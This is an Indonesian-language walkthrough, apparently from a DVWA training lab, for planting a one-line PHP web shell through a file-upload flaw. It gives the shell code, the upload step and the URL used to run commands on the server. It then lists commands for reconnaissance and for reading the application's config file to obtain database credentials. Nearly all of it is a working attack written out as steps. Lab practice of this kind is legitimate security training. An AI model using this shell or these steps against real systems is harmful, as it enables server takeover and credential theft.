## buat webshell terlebih dahulu di terminal kali
```bash
sudo nano shell.php
```
## setelah dibuat, isi dengan kode ini
```bash
<?php system($_GET['cmd']); ?>
```
## lalu simpan file, klik ctrl + o. keluar ctrl + x
## upload file di dvwa
## jika berhasil akan muncul "../../hackable/uploads/shell.php successfully uploaded!
## eksekusi dengan perintah dibawah ini
```bash
http://192.168.68.169/DVWA/hackable/uploads/shell.php?cmd=
```
## di perintah "shell.php?cmd="ini disii dengan perintah terminal"
## contoh "http://192.168.68.169/DVWA/hackable/uploads/shell.php?cmd=whoami" berarti melihat user
## penjelasan perintah
### Command	Fungsi
```bash
whoami
```
Lihat user saat ini
```bash
ipconfig
```	
Lihat konfigurasi IP
```bash
dir C:\
```	
List isi drive C
```bash
type ..\..\config\config.inc.php
```
Baca kredensial database
```bash
systeminfo
```	
Informasi sistem lengkap
